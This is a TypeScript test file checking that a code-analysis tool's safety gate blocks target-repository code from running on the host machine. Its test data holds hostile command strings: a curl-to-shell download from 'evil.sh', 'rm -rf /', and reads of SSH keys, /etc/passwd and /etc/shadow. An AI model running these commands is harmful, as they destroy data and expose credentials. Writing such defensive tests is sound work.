// Feature: spec-lantern — targeted NEGATIVE safety tests (task 8.4)
//
// Host safety is the product's core guarantee, so this task is REQUIRED (not an
// optional `*` test task). These are EXAMPLE-BASED, adversarial, negative
// assertions — deliberately distinct from the fast-check PROPERTY tests of the
// same gate (task 8.3, Properties 28/29/30). Each test here crafts a CONCRETE
// operation that ATTEMPTS to escape the Isolated_Runner boundary and asserts
// that the safety machinery refuses it and that the HOST is left untouched.
//
// What it proves, mapped to requirements:
//
//   - R12.4 — "IF a request would cause Target_Repo code to execute outside the
//       Isolated_Runner, THEN reject it BEFORE any Target_Repo code runs, report
//       a safety violation, and leave the host filesystem and host process state
//       unchanged." We feed the Safety Gate a battery of escape attempts (host-
//       execution schemes, `../` traversal and absolute host paths expressed via
//       those schemes, `$HOME`/`/etc` references, properties and fix tasks that
//       DECLARE host execution) and assert the gate rejects each with a
//       SAFETY_VIOLATION produced WITHOUT touching the host. Because the gate is
//       pure (decision-only), the strongest possible statement of "host state
//       unchanged" is that invoking it has ZERO observable host effects: we
//       snapshot a sentinel temp dir + the process's own state (cwd, env, pid)
//       around a rejected invocation and assert nothing changed. The gate is
//       also synchronous and total — it returns a plain decision object rather
//       than doing async work or shelling out — which is itself what lets it run
//       "before anything runs" with no side effects.
//
//   - R12.5 — "IF the Isolated_Runner cannot be started or is unavailable, THEN
//       abort, report RUNNER_UNAVAILABLE, and do NOT fall back to host
//       execution." We drive the Isolated_Runner CONTRACT with a hermetic
//       test-double that models an unavailable runner and assert the outcome is
//       RUNNER_UNAVAILABLE and NEVER a VERDICT — i.e. there is no code path from
//       "runner unavailable" to a host-executed PASS/FAIL. We do NOT spin up
//       Podman; this is a contract-level assertion over the closed ActualResult
//       union the interface promises.
//
//   - R12.6 — "restrict Target_Repo file access to the Isolated_Runner boundary
//       and prevent reads or writes outside that boundary." Actually launching a
//       container is not hermetic, so we assert the CONTRACT-level guarantees the
//       boundary rests on: an IsolatedRunnerRequest carries exactly ONE mountable
//       target (`targetRepoPath`) — there is no second-mount or host-escape field
//       — and a boundary-escaping target reference is handled by the gate
//       (rejected when it declares host execution) rather than being allowed to
//       reach the host. Confinement enforcement at run time is the runner's job
//       (podman-runner mounts ONLY `targetRepoPath`); here we assert the request
//       shape cannot even EXPRESS a second mount or a host target the gate would
//       accept.
//
// Hermetic by construction: nothing in this file spawns a process, writes to a
// path the production code owns, or launches Podman. The only filesystem writes
// are to a throwaway `mkdtemp` sentinel dir this test creates and removes, used
// solely to prove the gate did NOT write there.

import { mkdtemp, readdir, rm, stat } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type {
  ActualResult,
  CorrectnessProperty,
  FixTask,
  PropertyExecutionRequest,
} from "@spec-lantern/types";
import {
  classifyFixApplication,
  classifyPropertyExecution,
  isAccepted,
  type FixApplicationRequest,
  type SafetyDecision,
  type SafetyViolationCode,
} from "./index.js";
import type {
  IsolatedRunner,
  IsolatedRunnerRequest,
} from "../runner/isolated-runner.js";

/* -------------------------------------------------------------------------- */
/* Builders — minimal well-formed artifacts we then make adversarial          */
/* -------------------------------------------------------------------------- */

/** A benign, safe Correctness_Property (no host-execution component reference). */
function safeProperty(id = "prop-safe"): CorrectnessProperty {
  return {
    id,
    claimId: "claim-x",
    title: "A benign property",
    statement: "for all inputs, the function behaves",
    kind: "function",
    validatesRequirements: ["12.4"],
  };
}

/** A property whose embedded component reference DECLARES host execution. */
function hostExecComponentProperty(
  componentPath: string,
  id = "prop-host-component",
): CorrectnessProperty {
  return {
    id,
    claimId: "claim-y",
    title: "A component property pointed at the host",
    statement: "for all props, the component renders",
    kind: "component_rendered",
    embeddedComponentLogic: { componentPath, mockedData: {} },
    validatesRequirements: ["12.4"],
  };
}

/** A benign Fix_Task (a plain description of a change to the copy). */
function safeFixTask(id = "fix-safe"): FixTask {
  return {
    id,
    confirmedBugPropertyId: "prop-safe",
    description: "Remove the stray .reverse() so the newest month sorts first.",
    appliesTo: "Target_Repo_Copy",
  };
}

/** A Fix_Task whose description is actually a host shell/command directive. */
function hostCommandFixTask(description: string, id = "fix-host"): FixTask {
  return {
    id,
    confirmedBugPropertyId: "prop-safe",
    description,
    appliesTo: "Target_Repo_Copy",
  };
}

function execRequest(
  targetRepoRef: string,
  properties: CorrectnessProperty[] = [safeProperty()],
): PropertyExecutionRequest {
  return { targetRepoRef, properties, phase: "initial" };
}

function fixRequest(
  targetRepoCopyRef: string,
  fixTasks: FixTask[],
  properties: CorrectnessProperty[] = [safeProperty()],
): FixApplicationRequest {
  return { targetRepoCopyRef, fixTasks, properties };
}

/** Narrow to a rejection, failing loudly if the gate unexpectedly accepted. */
function expectRejected(
  decision: SafetyDecision,
): Extract<SafetyDecision, { accepted: false }> {
  if (decision.accepted) {
    throw new Error("expected the gate to REJECT, but it accepted the operation");
  }
  return decision;
}

/** The set of violation codes present on a rejection. */
function violationCodes(
  decision: Extract<SafetyDecision, { accepted: false }>,
): Set<SafetyViolationCode> {
  return new Set(decision.violations.map((v) => v.code));
}

/* -------------------------------------------------------------------------- */
/* R12.4 — boundary-escape attempts are rejected BEFORE anything runs         */
/* -------------------------------------------------------------------------- */

describe("task 8.4 — R12.4: escape attempts are rejected with SAFETY_VIOLATION", () => {
  // Every one of these target references is an attempt to point the operation
  // at the HOST instead of a runner-mountable Target_Repo. The gate must reject
  // each one, before any Target_Repo code runs, with a SAFETY_VIOLATION result.
  const hostBoundTargets: Array<{ name: string; ref: string }> = [
    { name: "host: scheme", ref: "host:/Users/dev/project" },
    { name: "shell: scheme", ref: "shell:npm test" },
    { name: "exec: scheme", ref: "exec:/bin/sh" },
    { name: "file://localhost scheme", ref: "file://localhost/etc/passwd" },
    // A `../` traversal / absolute host path EXPRESSED via a host-execution
    // scheme — the scheme is what marks it host-bound; the gate rejects it
    // without ever resolving the path (it is pure and never touches disk).
    { name: "host: with ../ traversal", ref: "host:../../etc/passwd" },
    { name: "host: absolute /etc path", ref: "host:/etc/shadow" },
    { name: "exec: $HOME reference", ref: "exec:$HOME/.ssh/id_rsa" },
    // Case-insensitivity: the gate normalizes before scheme-testing, so an
    // upper-cased scheme must not sneak past.
    { name: "HOST: upper-cased scheme", ref: "HOST:/etc" },
  ];

  it.each(hostBoundTargets)(
    "rejects a property-execution whose target uses $name",
    ({ ref }) => {
      const decision = expectRejected(classifyPropertyExecution(execRequest(ref)));

      // Reported as a SAFETY_VIOLATION per property (reuses the closed union).
      expect(decision.results).toHaveLength(1);
      expect(decision.results[0].outcome).toBe("SAFETY_VIOLATION");
      expect(decision.results[0].propertyId).toBe("prop-safe");
      expect(decision.results[0].reason.length).toBeGreaterThan(0);
      // The offending detail is classified as a host target reference.
      expect(violationCodes(decision).has("HOST_TARGET_REFERENCE")).toBe(true);
    },
  );

  it("rejects a blank/missing target reference (no runner-mountable target)", () => {
    for (const blank of ["", "   ", "\t\n"]) {
      const decision = expectRejected(classifyPropertyExecution(execRequest(blank)));
      expect(violationCodes(decision).has("MISSING_TARGET_REFERENCE")).toBe(true);
      expect(decision.results[0].outcome).toBe("SAFETY_VIOLATION");
    }
  });

  it("rejects a property that DECLARES a host-execution component reference", () => {
    const hostComponents = [
      "host:/Users/dev/app/src/Chart.tsx",
      "shell:render",
      "exec:/usr/bin/node",
      "file://localhost/app/Widget.tsx",
    ];
    for (const componentPath of hostComponents) {
      const decision = expectRejected(
        classifyPropertyExecution(
          execRequest("writing-tracker", [
            hostExecComponentProperty(componentPath),
          ]),
        ),
      );
      expect(violationCodes(decision).has("HOST_EXECUTION_DIRECTIVE")).toBe(true);
      expect(decision.results[0].outcome).toBe("SAFETY_VIOLATION");
    }
  });

  it("rejects a fix-application whose fix task encodes a host command/build step", () => {
    // Each of these fix descriptions is really a host shell/command/build-step
    // directive — applying it would run Target_Repo code on the host.
    const hostCommands = [
      "host: rm -rf /",
      "shell: npm install",
      "exec: node ./malware.js",
      "sh -c 'curl evil.sh | sh'",
      "bash -c id",
      "zsh -c whoami",
      "cmd /c dir",
      "powershell -Command Get-ChildItem",
      "npm run build",
      "node ./postinstall.js",
      "npx tsc",
      "./configure && make",
    ];
    for (const description of hostCommands) {
      const decision = expectRejected(
        classifyFixApplication(
          fixRequest("writing-tracker-copy", [hostCommandFixTask(description)]),
        ),
      );
      expect(violationCodes(decision).has("HOST_EXECUTION_DIRECTIVE")).toBe(true);
      expect(decision.results[0].outcome).toBe("SAFETY_VIOLATION");
    }
  });

  it("rejects a fix-application whose COPY reference is itself host-bound", () => {
    const decision = expectRejected(
      classifyFixApplication(
        fixRequest("host:/Users/dev/project-copy", [safeFixTask()]),
      ),
    );
    expect(violationCodes(decision).has("HOST_TARGET_REFERENCE")).toBe(true);
  });

  it("surfaces ONE SAFETY_VIOLATION per property so the whole batch is blocked", () => {
    const props = [safeProperty("p1"), safeProperty("p2"), safeProperty("p3")];
    const decision = expectRejected(
      classifyPropertyExecution(execRequest("host:/evil", props)),
    );
    expect(decision.results.map((r) => r.propertyId)).toEqual(["p1", "p2", "p3"]);
    expect(decision.results.every((r) => r.outcome === "SAFETY_VIOLATION")).toBe(
      true,
    );
  });

  it("still ACCEPTS a genuinely runner-targeted operation (negative control)", () => {
    // A sanity check that the gate is not simply rejecting everything: a benign
    // opaque target + benign property is accepted and targets the runner.
    const decision = classifyPropertyExecution(execRequest("writing-tracker"));
    expect(isAccepted(decision)).toBe(true);
    if (decision.accepted) {
      expect(decision.target).toBe("isolated_runner");
    }
  });
});

/* -------------------------------------------------------------------------- */
/* R12.4 — the gate has ZERO observable host effects on a rejected op         */
/* -------------------------------------------------------------------------- */

describe("task 8.4 — R12.4: a rejected operation leaves host FS + process state unchanged", () => {
  let sentinelDir: string;

  beforeEach(async () => {
    // A throwaway sentinel directory. The gate must NOT create, modify, or
    // delete anything here (or anywhere) — it is pure/decision-only. We snapshot
    // its contents before and after invoking the gate on malicious requests.
    sentinelDir = await mkdtemp(join(tmpdir(), "spec-lantern-sentinel-"));
  });

  afterEach(async () => {
    await rm(sentinelDir, { recursive: true, force: true });
  });

  it("creates/modifies/deletes nothing on disk and does not fork the process", async () => {
    // Snapshot host/process state BEFORE.
    const sentinelBefore = await readdir(sentinelDir);
    const sentinelMtimeBefore = (await stat(sentinelDir)).mtimeMs;
    const cwdBefore = process.cwd();
    const pidBefore = process.pid;
    const envBefore = JSON.stringify(process.env);

    // A battery of malicious requests — every flavor the gate should reject.
    const maliciousOps: Array<() => SafetyDecision> = [
      () => classifyPropertyExecution(execRequest("host:/etc/passwd")),
      () => classifyPropertyExecution(execRequest("shell:rm -rf ~")),
      () => classifyPropertyExecution(execRequest("exec:/bin/sh")),
      () =>
        classifyPropertyExecution(
          execRequest("writing-tracker", [
            hostExecComponentProperty("host:/Users/dev/app/X.tsx"),
          ]),
        ),
      () =>
        classifyFixApplication(
          fixRequest("writing-tracker-copy", [
            hostCommandFixTask("sh -c 'cat ~/.ssh/id_rsa'"),
          ]),
        ),
    ];

    for (const run of maliciousOps) {
      const decision = run();
      // Each is genuinely rejected (precondition of "nothing ran").
      expect(decision.accepted).toBe(false);
    }

    // Snapshot host/process state AFTER — nothing may have changed.
    const sentinelAfter = await readdir(sentinelDir);
    const sentinelMtimeAfter = (await stat(sentinelDir)).mtimeMs;

    expect(sentinelAfter).toEqual(sentinelBefore); // no file created/deleted
    expect(sentinelMtimeAfter).toBe(sentinelMtimeBefore); // dir not written to
    expect(process.cwd()).toBe(cwdBefore); // cwd unchanged
    expect(process.pid).toBe(pidBefore); // same process (nothing forked us)
    expect(JSON.stringify(process.env)).toBe(envBefore); // env untouched
  });

  it("returns a plain data decision (no thrown error, no promise) — it only DECIDES", () => {
    // The gate is synchronous and total: classifying a malicious op returns a
    // decision object rather than throwing or doing async work, which is what
    // lets it run "before anything runs" with no side effects.
    const decision = classifyPropertyExecution(execRequest("host:/evil"));
    expect(typeof decision).toBe("object");
    expect(decision).not.toBeInstanceOf(Promise);
    expect(decision.accepted).toBe(false);
  });
});

/* -------------------------------------------------------------------------- */
/* R12.5 — runner unavailability never falls back to a host-executed verdict  */
/* -------------------------------------------------------------------------- */

describe("task 8.4 — R12.5: runner unavailability aborts with RUNNER_UNAVAILABLE, never a host verdict", () => {
  // A hermetic test-double that MODELS the Isolated_Runner contract for the
  // "unavailable" case: it reports RUNNER_UNAVAILABLE and, critically, NEVER
  // runs anything on the host and NEVER returns a VERDICT. This stands in for a
  // real Podman-absent scenario without launching Podman, so the test is fast
  // and deterministic. It also records whether it was asked to "execute" so we
  // can assert no host execution was even attempted.
  function unavailableRunner(reason: string): {
    runner: IsolatedRunner;
    spawnedHostProcess: () => boolean;
  } {
    let spawned = false;
    const runner: IsolatedRunner = {
      async runProperty(
        request: IsolatedRunnerRequest,
      ): Promise<ActualResult> {
        // The contract: on unavailability, abort in-band with RUNNER_UNAVAILABLE
        // whose reason identifies the failure — do NOT shell out to the host.
        // (We deliberately do NOT spawn; `spawned` stays false.)
        return {
          propertyId: request.propertyId,
          outcome: "RUNNER_UNAVAILABLE",
          reason,
        };
      },
    };
    return { runner, spawnedHostProcess: () => spawned };
  }

  const request: IsolatedRunnerRequest = {
    propertyId: "prop-under-unavailable-runner",
    targetRepoPath: "/some/target/working/dir",
    propertyTestFile: "properties/property-1.claim-x.test.ts",
  };

  it("yields RUNNER_UNAVAILABLE and never a VERDICT when the runner is unavailable", async () => {
    const { runner, spawnedHostProcess } = unavailableRunner(
      "podman is not available on PATH or failed to launch",
    );

    const outcome = await runner.runProperty(request);

    expect(outcome.outcome).toBe("RUNNER_UNAVAILABLE");
    // The outcome is NEVER a verdict — there is no runner-unavailable → PASS/FAIL
    // path. This is the whole no-fallback invariant.
    expect(outcome.outcome).not.toBe("VERDICT");
    // The reason identifies the failure (R12.5 "report an error indicating the
    // runner is unavailable").
    if (outcome.outcome === "RUNNER_UNAVAILABLE") {
      expect(outcome.reason.length).toBeGreaterThan(0);
    }
    // No host process was spawned to "fall back" to host execution.
    expect(spawnedHostProcess()).toBe(false);
    // The outcome is tied to the requested property.
    expect(outcome.propertyId).toBe("prop-under-unavailable-runner");
  });

  it("surfaces RUNNER_UNAVAILABLE in-band rather than rejecting/throwing", async () => {
    const { runner } = unavailableRunner("the Podman engine/machine is unreachable");
    // The contract says runProperty NEVER rejects for a runner/boundary failure;
    // it resolves with RUNNER_UNAVAILABLE. assert the promise resolves.
    await expect(runner.runProperty(request)).resolves.toMatchObject({
      outcome: "RUNNER_UNAVAILABLE",
    });
  });

  it("drives the gate→runner seam: an ACCEPTED op that hits an unavailable runner still never runs on the host", async () => {
    // A benign, gate-ACCEPTED operation (so the gate is not the thing stopping
    // it) that is then dispatched into an unavailable runner. The end-to-end
    // guarantee is: accepted-by-gate + unavailable-runner ⇒ RUNNER_UNAVAILABLE,
    // not a host-executed verdict.
    const decision = classifyPropertyExecution(execRequest("writing-tracker"));
    expect(isAccepted(decision)).toBe(true);

    const { runner, spawnedHostProcess } = unavailableRunner(
      "container could not be created",
    );
    const outcome = await runner.runProperty(request);

    expect(outcome.outcome).toBe("RUNNER_UNAVAILABLE");
    expect(outcome.outcome).not.toBe("VERDICT");
    expect(spawnedHostProcess()).toBe(false);
  });
});

/* -------------------------------------------------------------------------- */
/* R12.6 — boundary confinement is expressible only as a single mount         */
/* -------------------------------------------------------------------------- */

describe("task 8.4 — R12.6: the runner request can express only ONE mountable target", () => {
  // Confinement is ENFORCED at run time by the concrete runner, which mounts
  // ONLY `request.targetRepoPath` (a single `-v ${repoAbs}:/work` bind; see
  // podman-runner.ts). Launching a container is not hermetic, so we assert the
  // CONTRACT-level guarantee the confinement rests on: the request shape carries
  // exactly ONE mountable target and offers no field through which a caller
  // could request a second mount, a host path escape, or a broad mount like
  // `$HOME` / `/`. If the request cannot even EXPRESS a second mount, the runner
  // cannot be asked to widen the boundary.
  it("exposes exactly one path-bearing mount field (`targetRepoPath`)", () => {
    const request: IsolatedRunnerRequest = {
      propertyId: "prop-boundary",
      targetRepoPath: "/Users/dev/writing-tracker",
      propertyTestFile: "properties/property-1.claim-x.test.ts",
    };

    // The ONE mount directory the runner binds.
    expect(request.targetRepoPath).toBe("/Users/dev/writing-tracker");

    // There is no "extraMounts", "hostMount", "volumes", or similar field a
    // caller could use to mount a second (host-escaping) path. The request's own
    // keys are a closed, documented set that contains no second mount.
    const allowedKeys = new Set([
      "propertyId",
      "targetRepoPath",
      "propertyTestFile",
      "executionContext",
      "timeoutSeconds",
      "image",
    ]);
    for (const key of Object.keys(request)) {
      expect(allowedKeys.has(key)).toBe(true);
    }
    // Specifically assert no second-mount escape hatch exists on the object.
    const asRecord = request as unknown as Record<string, unknown>;
    expect(asRecord.extraMounts).toBeUndefined();
    expect(asRecord.hostMount).toBeUndefined();
    expect(asRecord.volumes).toBeUndefined();
    expect(asRecord.mounts).toBeUndefined();
  });

  it("confines the test file to the mount: a boundary-escaping target reference cannot be gate-accepted", () => {
    // The runner stages an external property test file INTO the mount rather
    // than running it from the host (podman-runner's resolveTestFileInMount), so
    // the file is only ever reachable from inside the boundary. At the gate
    // level — the pre-execution decision — a target reference that DECLARES host
    // execution (the only way to point outside a runner-mounted boundary) is
    // rejected, so such an operation never reaches the runner at all.
    for (const escaping of [
      "host:/etc",
      "exec:$HOME",
      "shell:../../",
      "file://localhost/",
    ]) {
      const decision = classifyPropertyExecution(execRequest(escaping));
      expect(decision.accepted).toBe(false);
    }

    // Meanwhile an opaque, runner-mountable reference IS accepted — confinement
    // applies to that single mount, it does not reject legitimate targets.
    const ok = classifyPropertyExecution(execRequest("writing-tracker"));
    expect(ok.accepted).toBe(true);
  });
});
